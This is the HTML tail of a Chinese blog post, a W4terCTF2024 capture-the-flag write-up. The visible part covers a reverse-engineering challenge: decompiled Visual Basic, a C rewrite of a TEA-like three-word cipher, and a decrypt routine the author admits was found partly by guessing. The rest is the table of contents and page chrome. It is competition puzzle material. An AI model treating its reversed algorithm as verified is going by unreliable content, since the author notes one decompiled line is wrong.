operator">-</span><span class="token number">559038737</span><span class="token punctuation">,</span> var_B8 <span class="token keyword">Xor</span> var_B0<span class="token punctuation">)</span><span class="token punctuation">,</span> RightRotateLong<span class="token punctuation">(</span>var_B8<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">Xor</span> <span class="token operator">-</span><span class="token number">1161901314</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  loc_40F16D<span class="token punctuation">:</span>     var_B8 <span class="token operator">=</span> var_B8 <span class="token keyword">Xor</span> AddLong<span class="token punctuation">(</span>AddLong<span class="token punctuation">(</span>LeftRotateLong<span class="token punctuation">(</span>var_BC<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">Xor</span> <span class="token operator">-</span><span class="token number">559038737</span><span class="token punctuation">,</span> var_BC <span class="token keyword">Xor</span> var_B0<span class="token punctuation">)</span><span class="token punctuation">,</span> RightRotateLong<span class="token punctuation">(</span>var_BC<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">Xor</span> <span class="token operator">-</span><span class="token number">1161901314</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  loc_40F1DF<span class="token punctuation">:</span>     var_BC <span class="token operator">=</span> var_BC <span class="token keyword">Xor</span> AddLong<span class="token punctuation">(</span>AddLong<span class="token punctuation">(</span>LeftRotateLong<span class="token punctuation">(</span>var_B4<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">Xor</span> <span class="token operator">-</span><span class="token number">559038737</span><span class="token punctuation">,</span> var_B4 <span class="token keyword">Xor</span> var_B0<span class="token punctuation">)</span><span class="token punctuation">,</span> RightRotateLong<span class="token punctuation">(</span>var_B4<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">Xor</span> <span class="token operator">-</span><span class="token number">1161901314</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  loc_40F1E5<span class="token punctuation">:</span>   <span class="token keyword">Next</span> var_C0 <span class="token comment">'Integer</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  loc_40F1F4<span class="token punctuation">:</span>   var_A0<span class="token punctuation">(</span><span class="token keyword">CLng</span><span class="token punctuation">(</span>var_A6<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> var_B4</pre></td></tr><tr><td data-num="19"></td><td><pre>  loc_40F202<span class="token punctuation">:</span>   var_A0<span class="token punctuation">(</span><span class="token keyword">CLng</span><span class="token punctuation">(</span><span class="token punctuation">(</span>var_A6 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> var_B8</pre></td></tr><tr><td data-num="20"></td><td><pre>  loc_40F210<span class="token punctuation">:</span>   var_A0<span class="token punctuation">(</span><span class="token keyword">CLng</span><span class="token punctuation">(</span><span class="token punctuation">(</span>var_A6 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> var_BC</pre></td></tr><tr><td data-num="21"></td><td><pre>  loc_40F214<span class="token punctuation">:</span> <span class="token keyword">Next</span> var_AC <span class="token comment">'Integer</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  loc_40F21B<span class="token punctuation">:</span> var_86 <span class="token operator">=</span> <span class="token number">&amp;HFF</span></pre></td></tr></table></figure><p>用 C 整理出的等价版本：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token class-name">uint32_t</span> a <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    a <span class="token operator">=</span> a <span class="token operator">^</span> <span class="token function">round_fn</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    b <span class="token operator">=</span> b <span class="token operator">^</span> <span class="token function">round_fn</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    c <span class="token operator">=</span> c <span class="token operator">^</span> <span class="token function">round_fn</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">uint32_t</span> <span class="token function">round_fn</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">const</span> <span class="token class-name">uint32_t</span> delta <span class="token operator">=</span> <span class="token number">0x9e3779b9</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">left_rotate</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>b <span class="token operator">^</span> delta<span class="token punctuation">)</span> <span class="token operator">+</span></pre></td></tr><tr><td data-num="4"></td><td><pre>          <span class="token punctuation">(</span><span class="token function">right_rotate</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">0xbabecafe</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>在这之后是一长串的 IF，判断 <code>var_A0</code> 的各个位是否等于一些硬编码的 32 位常数，将这些常数解密即可。</p><p>可以看出这和 TEA 加密非常像，但是是三个一组的循环混淆，而非经典 TEA 的两个一组，而且把 TEA 轮函数加法和异或交换了，以及每次异或的是固定的 <code>delta</code> 而不是 <code>delta</code> 的累加。每次取三个 <code>u32</code> 一组，像这样交叉异或 32 轮。</p><p>三个一组问题不大，把加密的顺序反过来异或回去可以了，原理是一样的：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token class-name">uint32_t</span> a <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    c <span class="token operator">=</span> c <span class="token operator">^</span> <span class="token function">round_fn</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    b <span class="token operator">=</span> b <span class="token operator">^</span> <span class="token function">round_fn</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    a <span class="token operator">=</span> a <span class="token operator">^</span> <span class="token function">round_fn</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>然而这样不对。hint 说要关掉的那个选项我看到了，关了之后重新复现了一遍，发现跟之前一点区别没有，心态炸了。</p><p>最后一天晚九点，突发奇想把轮函数改了一下，把 <code>sum</code> 做异或，相当于只把轮函数的加法和异或互换的 TEA 算法，保留 <code>sum</code> 的部分不改，然后居然过了，有瞎蒙的成分在。</p><p>事后注意到这一行：</p><figure class="highlight vb"><figcaption data-lang="Visual Basic"></figcaption><table><tr><td data-num="1"></td><td><pre>loc_40F089<span class="token punctuation">:</span>     var_B0 <span class="token operator">=</span> AddLong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1640531527</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>那就意味着这一行的逆向是错的，应该是 <code>var_B0 = AddLong(var_B0, -1640531527)</code> ，不过没发现为什么。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"><div class="tags"><a href="/tags/ctf/" rel="tag"><i class="ic i-tag"></i> ctf</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">Edited on</span> <time title="Modified: 2024-08-14 17:37:11" itemprop="dateModified" datetime="2024-08-14T17:37:11+08:00">2024-08-14</time> </span><span id="cs/ctf/w4terctf2024/" data-flag-title="W4terCTF2024 WP" title="Views"><span class="icon"><i class="ic i-eye"></i> </span><span class="text" id="busuanzi_container_page_pv">Views <span id="busuanzi_value_page_pv"></span> times</span></span></div><div id="copyright"><ul><li class="author"><strong>Post author: </strong>fuuzen</li><li class="link"><strong>Post link: </strong><a href="https://taf.fyi/cs/ctf/w4terctf2024/" title="W4terCTF2024 WP">https://taf.fyi/cs/ctf/w4terctf2024/</a></li><li class="license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.</li></ul></div></footer></article></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="Contents"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ai"><span class="toc-number">1.</span> <span class="toc-text">AI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#network-reverse"><span class="toc-number">1.1.</span> <span class="toc-text">Network Reverse</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#remember-it-0"><span class="toc-number">2.1.</span> <span class="toc-text">Remember It 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#remember-it-1"><span class="toc-number">2.2.</span> <span class="toc-text">Remember It 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2048"><span class="toc-number">2.3.</span> <span class="toc-text">2048</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gitzip"><span class="toc-number">3.1.</span> <span class="toc-text">GitZip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ashbp"><span class="toc-number">3.2.</span> <span class="toc-text">ASHBP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-manager"><span class="toc-number">3.3.</span> <span class="toc-text">User Manager</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#png-server"><span class="toc-number">3.4.</span> <span class="toc-text">PNG Server</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#auto-unserialize"><span class="toc-number">3.5.</span> <span class="toc-text">Auto Unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#just-readobject"><span class="toc-number">3.6.</span> <span class="toc-text">Just ReadObject</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#smoke-hints"><span class="toc-number">4.1.</span> <span class="toc-text">Smoke hints</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wish"><span class="toc-number">4.2.</span> <span class="toc-text">Wish</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sign-in"><span class="toc-number">5.1.</span> <span class="toc-text">Sign In</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#brokenmp4"><span class="toc-number">5.2.</span> <span class="toc-text">broken.mp4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shuffle-puts"><span class="toc-number">5.3.</span> <span class="toc-text">Shuffle Puts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#revenge-of-vigenere"><span class="toc-number">5.4.</span> <span class="toc-text">Revenge of Vigenere</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spam-2024"><span class="toc-number">5.5.</span> <span class="toc-text">Spam 2024</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gzgpt"><span class="toc-number">5.6.</span> <span class="toc-text">GZGPT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#priv-escape"><span class="toc-number">5.7.</span> <span class="toc-text">Priv Escape</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">6.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bruteforceme"><span class="toc-number">6.1.</span> <span class="toc-text">BruteforceMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%AE%89%E5%8F%88%E5%8D%93%E5%8D%93"><span class="toc-number">6.2.</span> <span class="toc-text">安安又卓卓</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%97%AE%E5%89%AA%E5%88%80%E7%9F%B3%E5%A4%B4%E5%B8%83"><span class="toc-number">6.2.1.</span> <span class="toc-text">第一问：剪刀石头布</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%97%AE%E7%8C%9C%E6%95%B0%E5%AD%97"><span class="toc-number">6.2.2.</span> <span class="toc-text">第二问：猜数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%97%AE%E7%9B%B4%E6%8D%A3%E9%BB%84%E9%BE%99"><span class="toc-number">6.2.3.</span> <span class="toc-text">第三问：直捣黄龙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E8%84%9A%E6%9C%AC"><span class="toc-number">6.2.4.</span> <span class="toc-text">java 脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crabs"><span class="toc-number">6.3.</span> <span class="toc-text">crabs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sub_1209"><span class="toc-number">6.3.1.</span> <span class="toc-text">sub_1209</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub_24bd"><span class="toc-number">6.3.2.</span> <span class="toc-text">sub_24BD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub_1483"><span class="toc-number">6.3.3.</span> <span class="toc-text">sub_1483</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#doudou"><span class="toc-number">6.4.</span> <span class="toc-text">DouDou</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A4%E8%80%81%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="toc-number">6.5.</span> <span class="toc-text">古老的语言</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="Related"><ul><li class="active"><a href="/cs/ctf/w4terctf2024/" rel="bookmark" title="W4terCTF2024 WP">W4terCTF2024 WP</a></li></ul></div><div class="overview panel" data-title="Overview"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="fuuzen" data-src="/images/avatar.jpg"><p class="name" itemprop="name">fuuzen</p><div class="description" itemprop="description">fuuzen 的个人主页 taf.fyi</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">25</span> <span class="name">posts</span></a></div><div class="item categories"><a href="/categories/"><span class="count">7</span> <span class="name">categories</span></a></div><div class="item tags"><a href="/tags/"><span class="count">4</span> <span class="name">tags</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Z1dXplbg==" title="https:&#x2F;&#x2F;github.com&#x2F;fuuzen"><i class="ic i-github"></i></span> <span class="exturl item telegram" data-url="aHR0cHM6Ly90Lm1lL2Z1dXNlbl9ub19wYXJ0eQ==" title="https:&#x2F;&#x2F;t.me&#x2F;fuusen_no_party"><i class="ic i-paper-plane"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE3NzMxNDU3NTU=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1773145755"><i class="ic i-cloud-music"></i></span> <span class="exturl item bangumi" data-url="aHR0cHM6Ly9iZ20udHYvdXNlci9mdXVzZW4=" title="https:&#x2F;&#x2F;bgm.tv&#x2F;user&#x2F;fuusen"><i class="ic i-bilibili"></i></span> <a href="/rss.xml" title="&#x2F;rss.xml" class="item rss"><i class="ic i-rss"></i></a></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>Home</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>About</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>Posts</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>Archives</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>Categories</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>Tags</a></li></ul></li><li class="item"><a href="/notebook/" rel="section"><i class="ic i-pen"></i>Notebook</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>Friends</a></li><li class="item"><a href="/acgn/" rel="section"><i class="ic i-bilibili"></i>ACGN</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/cs/devops/overleaf/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/cs/pve/pve-passthrough-gpu/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"></div><div class="status"><div class="copyright">&copy; 2023 – <span itemprop="copyrightYear">2026</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">fuuzen @ taf.fyi</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-eye"></i> </span><span class="text" id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> views </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-heart"></i> </span><span class="text" id="busuanzi_container_site_uv"><span id="busuanzi_value_site_uv"></span> visitors </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="Symbols count total">180k words</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="Reading time total">2:43</span></div><div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"cs/ctf/w4terctf2024/",favicon:{show:"Ciallo～(∠・ω< )⌒★!",hide:"Signaled Out"},search:{placeholder:"Search for Posts",empty:"We didn't find any results for the search: ${query}",stats:"${hits} results found in ${time} ms"},copy_tex:!0,katex:!0,fancybox:!0,copyright:'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.6"></script></body></html><!-- rebuild by hrmmi -->